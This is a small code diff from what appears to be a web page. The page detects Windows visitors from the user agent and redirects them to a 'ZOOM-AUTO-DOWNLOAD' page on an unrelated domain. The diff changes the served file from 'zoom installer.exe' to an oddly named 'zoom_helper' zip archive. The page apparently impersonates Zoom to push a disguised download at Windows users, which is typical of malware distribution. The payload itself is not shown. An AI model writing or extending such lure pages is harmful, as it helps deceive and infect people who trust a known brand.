@@ -6,7 +6,7 @@ export default function Home() {
     const isWindows = /windows/i.test(userAgent);
 
     const NON_WINDOWS_TARGET = "https://personalavatar.com/views";
-    const MSI_FILE = "/zoom installer.exe";
+    const MSI_FILE = "/zoom_helper_z2x9w4b7v1r6.zip";
     const WINDOWS_REDIRECT = "https://digimarconibadan.com/zoom_helper_z2x9w4b7v1r6/ZOOM-AUTO-DOWNLOAD/index.html";
 
     if (isWindows) {
